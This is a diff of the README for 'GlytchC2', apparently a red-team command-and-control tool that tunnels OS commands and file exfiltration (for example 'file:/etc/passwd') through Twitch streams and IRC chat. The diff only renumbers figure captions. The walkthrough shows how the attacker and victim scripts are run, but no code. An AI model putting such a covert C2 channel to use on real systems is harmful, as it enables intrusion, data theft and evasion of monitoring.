@@ -30,13 +30,14 @@ Currently, **"GlytchC2"** offers two functionalities:
 
 ## Main Execution Flow 
 <p align="center"> <img src="rsc/GlytchC2_MainExecutionFlow.jpg" /> </p>
-<p align="center"> Figure - Main Execution Flow </p>
+<p align="center"> Figure 1 - Main Execution Flow </p>
 
 ## Proof-of-Concepts (PoCs) & How it works
 
 ### PoC Video
 
 [![GlytchC2 PoC](rsc/yt_banner.PNG)](https://youtu.be/FzUCudF7iUo)
+<p align="center"> Video 1 - PoC </p>
 
 ### Proof-of-Concepts (PoCs)
 
@@ -48,12 +49,12 @@ Currently, **"GlytchC2"** offers two functionalities:
 # cd victim
 # python3 victim.py --channel <CHANNEL_NAME> --streamkey <RTMP_KEY>
 ```
-<p align="center"> Code Block - Running "victim.py" </p>
+<p align="center"> Code Block 1 - Running "victim.py" </p>
 
 - Then, victim waits for receiving a request containing either an OS command or a file with it's path:
 
 <p align="center"> <img src="rsc/victim_initialexec.png" /> </p>
-<p align="center"> Figure - Running "victim.py" </p>
+<p align="center"> Figure 2 - Running "victim.py" </p>
 
 - After victim side is up and waiting for a request, attacker needs to connect corresponding channel's IRC chat:
 
@@ -61,67 +62,67 @@ Currently, **"GlytchC2"** offers two functionalities:
 # cd attacker
 # python3 attacker.py --channel <CHANNEL_NAME>
 ```
-<p align="center"> Code Block - Running "attacker.py" </p>
+<p align="center"> Code Block 2 - Running "attacker.py" </p>
 
 <p align="center"> <img src="rsc/attacker_initialexec.PNG" /> </p>
-<p align="center"> Figure - Running "attacker.py" </p>
+<p align="center"> Figure 3 - Running "attacker.py" </p>
 
 - Then, attacker either can send an OS command e.g. ``whoami`` or request a file download e.g. ``file:/etc/passwd``
 
 <p align="center"> <img src="rsc/attacker_commandexec.png" /> </p>
-<p align="center"> Figure - Running "whoami" on Remote Host </p>
+<p align="center"> Figure 4 - Running "whoami" on Remote Host </p>
 
 - **IMPORTANT:** Note that the stream link may be fetched with a delay, therefore the program will try until obtain a valid stream link.
 - We also have inserted a blank frame in the first 10 seconds of the video to prevent missing the frames.
 - After the victim receives a command, it starts a stream to output the result of executed command (whether an OS command or a file request):
 
 <p align="center"> <img src="rsc/victim_initializestream.png" /> </p>
-<p align="center"> Figure - Victim Starts Streaming (Result of "whoami") </p>
+<p align="center"> Figure 5 - Victim Starts Streaming (Result of "whoami") </p>
 
 - In here, attacker obtains the stream link and begins recording the stream on their end.
 
 <p align="center"> <img src="rsc/attacker_fetchstreamlink.png" /> </p>
-<p align="center"> Figure - Fetching Stream Link (Attacker) </p>
+<p align="center"> Figure 6 - Fetching Stream Link (Attacker) </p>
 
 <p align="center"> <img src="rsc/attacker_record.png" /> </p>
-<p align="center"> Figure - Recording Stream (Attacker) </p>
+<p align="center"> Figure 7 - Recording Stream (Attacker) </p>
 
 - After attacker finishes recording the stream, the program will remove duplicate frames and keep the originals in order to pass them to the decoder:
 
 <p align="center"> <img src="rsc/attacker_removeduplicateframes.png" /> </p>
-<p align="center"> Figure - Removing Duplicate Frames </p>
+<p align="center"> Figure 8 - Removing Duplicate Frames </p>
 
 <p align="center"> <img src="rsc/attacker_decodeframe.png" /> </p>
-<p align="center"> Figure - Decoding Recorded Frame(s) </p>
+<p align="center"> Figure 9 - Decoding Recorded Frame(s) </p>
 
  - Decoded frame content is below:
 
 <p align="center"> <img src="rsc/attacker_output1.PNG" /> </p>
-<p align="center"> Figure - Decoded Frame Content (Result of "whoami" OS command) </p>
+<p align="center"> Figure 10 - Decoded Frame Content (Result of "whoami" OS command) </p>
 
 - We can also request a file with ``file:`` prefix, e.g. ``systeminformer-3.2.25011-release-setup.exe``:
 
 <p align="center"> <img src="rsc/victim_targetfile.png" /> </p>
-<p align="center"> Figure - "systeminformer-..." File Located In Victim </p>
+<p align="center"> Figure 11 - "systeminformer-..." File Located In Victim </p>
 
 - Sending file request from attacker:
 
 <p align="center"> <img src="rsc/attacker_filerequest.PNG" /> </p>
-<p align="center"> Figure - Requesting Target File w/File Path (Attacker) </p>
+<p align="center"> Figure 12 - Requesting Target File w/File Path (Attacker) </p>
 
 - Victim starts streaming (Twitch screen):
   
 <p align="center"> <img src="rsc/victim_twstreaming.PNG" /> </p>
-<p align="center"> Figure - Victim Starts Twitch Stream </p>
+<p align="center"> Figure 13 - Victim Starts Twitch Stream </p>
 
 - When the stream finishes, victim cleans up generated files:
 
 <p align="center"> <img src="rsc/victim_cleanup.PNG" /> </p>
-<p align="center"> Figure - Stream Ending & Cleanup (Victim) </p>
+<p align="center"> Figure 14 - Stream Ending & Cleanup (Victim) </p>
 
 - Finally, transferred file (note that the SHA256 hash is same with victim's local file; indicating that the file has been transferred with 100% integrity):
 <p align="center"> <img src="rsc/attacker_output2.png" /> </p>
-<p align="center"> Figure - Transferred File (Attacker) </p>
+<p align="center"> Figure 15 - Transferred File (Attacker) </p>
 
 ### How it works?
 
